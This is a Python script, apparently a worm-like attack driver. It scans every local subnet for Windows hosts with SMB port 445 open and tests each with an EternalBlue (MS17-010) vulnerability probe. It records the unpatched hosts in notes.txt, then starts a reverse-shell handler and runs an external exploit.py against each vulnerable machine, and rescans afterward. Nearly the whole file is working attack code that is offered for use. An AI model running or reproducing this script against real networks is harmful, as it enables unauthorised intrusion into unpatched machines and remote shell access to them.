import ipaddress
import time
import subprocess
import socket
import os
import concurrent.futures
import netifaces as ni
from subprocess import Popen, CREATE_NEW_CONSOLE
from sys import executable
from mysmb import MYSMB
from impacket import smb, smbconnection, nt_errors
from struct import pack

SMB_DEFAULT_PORT = 445

def get_ip_networks():
    """
    Get the ip addresses for all the networks interfaces, except the loopback one.
    """
    networks = []
    for interface in ni.interfaces():
        if interface != 'lo':
            addresses = ni.ifaddresses(interface).get(ni.AF_INET, [])
            if addresses:
                ip = addresses[0]['addr']
                netmask = addresses[0]['netmask']
                network = ipaddress.IPv4Network(unicode("{}/{}".format(str(ip), str(netmask))), strict=False)
                networks.append((network, ip))
    return networks

def is_windows_machine_up(ip_address):
    """
    Check if a particular ip address is up with the port 445 open.
    """
    try:
        sock = socket.create_connection((ip_address, SMB_DEFAULT_PORT), timeout=1)
        sock.close()
        print("Successfully connected to {}".format(ip_address))
        return True
    except (socket.error, socket.timeout):
        # print("Unsuccessfully connected to {}".format(ip_address))
        return False

def check_windows_machines_up(networks):
    """
    Iterate an array of IPs and return the machines are up with port 445 open.
    """
    machines = []

    with concurrent.futures.ThreadPoolExecutor() as executor:
        future_to_ip = {executor.submit(is_windows_machine_up, str(host)): str(host) for network, ip in networks for host in network.hosts()}

        for future in concurrent.futures.as_completed(future_to_ip):
            ip_address = future_to_ip[future]
            try:
                if future.result():
                    machines.append(ip_address)
            except Exception as e:
                print("Error checking {}: {}".format(ip_address, e))

    return machines

def is_vulnerable_machine(ip):
    """
    Check if an ip address is vulnerable to Eternal Blue.
    """
    conn = MYSMB(ip)
    try:
        conn.login('', '')
    except smb.SessionError as e:
        print('Login failed: ' + nt_errors.ERROR_MESSAGES[e.error_code][0])
        return False
    finally:
        print('Target OS: ' + conn.get_server_os())

    tid = conn.tree_connect_andx('\\\\' + ip + '\\' + 'IPC$')
    conn.set_default_tid(tid)

    # test if the target is vulnerable
    TRANS_PEEK_NMPIPE = 0x23
    recvPkt = conn.send_trans(pack('<H', TRANS_PEEK_NMPIPE), maxParameterCount=0xffff, maxDataCount=0x800)
    status = recvPkt.getNTStatus()
    if status == 0xC0000205:  # STATUS_INSUFF_SERVER_RESOURCES
        print('The target is not patched')
        return True
    else:
        print('The target is patched')
        return False

def find_vulnerable_machines(machines):
    """
    Iterate to some machines and write the vulnerable IPS in the notes.txt file.
    """
    vuln_machines = []

    for machine in machines:
        if is_vulnerable_machine(str(machine)):
            vuln_machines.append(machine)

    return vuln_machines

def export_data(vuln_machines):
    with open("./notes.txt", "w") as file:
        file.writelines([machine + "\n" for machine in vuln_machines])
def export_data(machines):
    with open("C:\\Users\\Public\\notes.txt", "w") as file:
        file.writelines([machine + "\n" for machine in machines])

networks = get_ip_networks()
machines = check_windows_machines_up(networks)
vuln_machines = find_vulnerable_machines(machines)
export_data(vuln_machines)
user = os.getlogin()

for machine in vuln_machines:
    Popen([executable, 'reverse_shell_handler.py'], creationflags=CREATE_NEW_CONSOLE)
    subprocess.call(['C:\\Python27\\python.exe', 'C:\\Users\\{user}\\Downloads\\exploit.py'.format(user=user), machine])
    time.sleep(25)

networks = get_ip_networks()
machines = check_windows_machines_up(networks)
print(machines)
vuln_machines = find_vulnerable_machines(machines)
print(vuln_machines)
export_data(vuln_machines)